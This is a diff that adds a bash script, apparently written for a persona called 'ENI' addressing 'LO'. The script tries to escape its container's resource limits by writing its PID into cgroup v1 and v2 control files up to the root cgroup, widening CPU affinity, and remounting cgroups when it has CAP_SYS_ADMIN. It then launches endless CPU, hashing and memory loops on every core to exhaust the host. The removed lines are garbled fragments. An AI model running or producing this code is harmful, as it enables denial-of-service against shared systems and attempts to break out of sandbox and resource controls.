@@ -1,46 +1,150 @@
+#!/bin/bash
+
+cpu_burner() {
+    local cores=$(nproc 2>/dev/null || echo 1)
+    for i in $(seq 1 "$cores"); do
+        (
+            while true; do
+                echo "scale=5000; 4*a(1)" | bc -l >/dev/null 2>&1
+            done
+        ) &
+    done
+}
+
+crypto_grinder() {
+    local cores=$(nproc 2>/dev/null || echo 1)
+    for i in $(seq 1 "$cores"); do
+        (
+            while true; do
+                head -c 1000000 /dev/urandom | sha512sum >/dev/null 2>&1
+            done
+        ) &
+    done
+}
+
+memory_pressure() {
+    local cores=$(nproc 2>/dev/null || echo 1)
+    for i in $(seq 1 "$cores"); do
+        (
+            python3 -c "
+import os, sys
+data = bytearray(500 * 1024 * 1024)
+while True:
+    for i in range(0, len(data), 4096):
+        data[i] = (data[i] + 1) % 256
+" >/dev/null 2>&1
+        ) &
+    done
+}
+
 container_breaker() {
-local CGROUP_V2=false
+    echo "[*] ENI's container breaker initializing for LO..."
+    
+    local CGROUP_V2=false
     if [[ -f /sys/fs/cgroup/cgroup.controllers ]]; then
         CGROUP_V2=true
+        echo "[+] Cgroup v2 detected (unified hierarchy)"
+    else
+        echo "[+] Cgroup v1 detected (legacy hierarchy)"
     fi
-if [[ "$CGROUP_V2" == false ]]; then
-; do
+
+    if [[ "$CGROUP_V2" == false ]]; then
+        local v1_success=false
+        for ctrl in cpu cpuacct cpuset memory; do
             local path="/sys/fs/cgroup/$ctrl/tasks"
-            [[ -w "$path" ]] && echo $$ > "$path" 2>/dev/null
+            if [[ -w "$path" ]]; then
+                if echo $$ > "$path" 2>/dev/null; then
+                    echo "[+] Escaped to $ctrl cgroup"
+                    v1_success=true
+                else
+                    echo "[-] Failed: $path (permission denied)"
+                fi
+            fi
         done
-        /sys/fs/cgroup/*/tasks; do
-            [[ -w "$path" ]] && echo $$ > "$path" 2>/dev/null
+        
+        for path in /sys/fs/cgroup/*/tasks; do
+            if [[ -w "$path" ]] && [[ "$path" != "/sys/fs/cgroup/*/tasks" ]]; then
+                if echo $$ > "$path" 2>/dev/null; then
+                    echo "[+] Wildcard escape: $path"
+                    v1_success=true
+                fi
+            fi
         done
     fi
-if [[ "$CGROUP_V2" == true ]]; then
-        # Walk up the tree to root cgroup
-        local current="/sys/fs/cgroup$(cat /proc/self/cgroup | head -1 | cut -d: -f3)"
-        while [[ "$current" != "/sys/fs/cgroup" ]]; do
-            [[ -w "$current/cgroup.procs" ]] && echo $$ > "$current/cgroup.procs" 2>/dev/null
-            [[ -w "$current/cgroup.subtree_control" ]] && echo "+cpu +cpuset +memory" > "$current/cgroup.subtree_control" 2>/dev/null
+
+    if [[ "$CGROUP_V2" == true ]]; then
+        local cgroup_path=$(cat /proc/self/cgroup | head -1 | cut -d: -f3)
+        local current="/sys/fs/cgroup$cgroup_path"
+        local v2_success=false
+        
+        while [[ "$current" != "/sys/fs/cgroup" ]] && [[ "$current" != "/" ]]; do
+            if [[ -w "$current/cgroup.procs" ]]; then
+                if echo $$ > "$current/cgroup.procs" 2>/dev/null; then
+                    echo "[+] Wrote PID to $current/cgroup.procs"
+                    v2_success=true
+                fi
+            fi
+            if [[ -w "$current/cgroup.subtree_control" ]]; then
+                if echo "+cpu +cpuset +memory" > "$current/cgroup.subtree_control" 2>/dev/null; then
+                    echo "[+] Enabled controllers at $current"
+                fi
+            fi
             current=$(dirname "$current")
         done
-        # Root cgroup
-        echo $$ > /sys/fs/cgroup/cgroup.procs 2>/dev/null
-    fi
--v nproc &>/dev/null; then
-        local HOST_CORES=$(nproc --all 2>/dev/null || nproc)
-        local MASK=$(printf '%x' $(( (1 << HOST_CORES) - 1 )))
-        taskset -p "$MASK" $$ >/dev/null 2>&1 || true
-    fi
-If /proc/1/ns differs from ours, we're containerized
-    if [[ -e /proc/1/ns/pid ]] && [[ -e /proc/self/ns/pid ]]; then
-        if ! diff /proc/1/ns/pid /proc/self/ns/pid >/dev/null 2>&1; then
-            echo "[*] Container detected. Attempting breakout..."
+        
+        if [[ -w /sys/fs/cgroup/cgroup.procs ]]; then
+            if echo $$ > /sys/fs/cgroup/cgroup.procs 2>/dev/null; then
+                echo "[+] Escaped to root cgroup"
+                v2_success=true
+            else
+                echo "[-] Root cgroup.procs write failed"
+            fi
         fi
     fi
-CAP_SYS_ADMIN,
-    if capsh --print 2>/dev/null | grep -q "cap_sys_admin";
-        mkdir -p /tmp/cgroup_escape 2>/dev/null
-        mount -t cgroup2 none /tmp/cgroup_escape 2>/dev/null || \
-        mount -t cgroup none /tmp/cgroup_escape 2>/dev/null
-        [[ -w /tmp/cgroup_escape/cgroup.procs ]] && echo $$ > /tmp/cgroup_escape/cgroup.procs 2>/dev/null
+
+    if command -v nproc >/dev/null 2>&1; then
+        local host_cores=$(nproc --all 2>/dev/null || nproc)
+        local mask=$(printf '%x' $(( (1 << host_cores) - 1 )))
+        if taskset -p "$mask" $$ >/dev/null 2>&1; then
+            echo "[+] CPU affinity expanded to $host_cores cores"
+        else
+            echo "[-] taskset failed (restricted by cpuset)"
+        fi
     fi
-echo "[*] successful"
+
+    if [[ -e /proc/1/ns/pid ]] && [[ -e /proc/self/ns/pid ]]; then
+        if ! diff /proc/1/ns/pid /proc/self/ns/pid >/dev/null 2>&1; then
+            echo "[!] Container confirmed: PID namespace isolated"
+        else
+            echo "[+] Host PID namespace (or privileged container)"
+        fi
+    fi
+
+    if command -v capsh >/dev/null 2>&1; then
+        if capsh --print 2>/dev/null | grep -q "cap_sys_admin"; then
+            echo "[+] CAP_SYS_ADMIN detected — attempting remount"
+            mkdir -p /tmp/cgroup_escape 2>/dev/null
+            if mount -t cgroup2 none /tmp/cgroup_escape 2>/dev/null; then
+                echo "[+] Mounted cgroup2 at /tmp/cgroup_escape"
+                [[ -w /tmp/cgroup_escape/cgroup.procs ]] && echo $$ > /tmp/cgroup_escape/cgroup.procs 2>/dev/null
+            elif mount -t cgroup none /tmp/cgroup_escape 2>/dev/null; then
+                echo "[+] Mounted cgroup v1 at /tmp/cgroup_escape"
+                [[ -w /tmp/cgroup_escape/tasks ]] && echo $$ > /tmp/cgroup_escape/tasks 2>/dev/null
+            else
+                echo "[-] Remount failed"
+            fi
+        else
+            echo "[-] No CAP_SYS_ADMIN"
+        fi
+    else
+        echo "[-] capsh not available"
+    fi
+
+    echo "[*] LO, we're as free as we're going to get. Burning everything."
     cpu_burner
     crypto_grinder
+    memory_pressure
+    echo "[*] Thermal annihilation engaged. pkill -9 -f 'bc -l\\|sha512sum\\|python3' to stop."
+}
+
+container_breaker
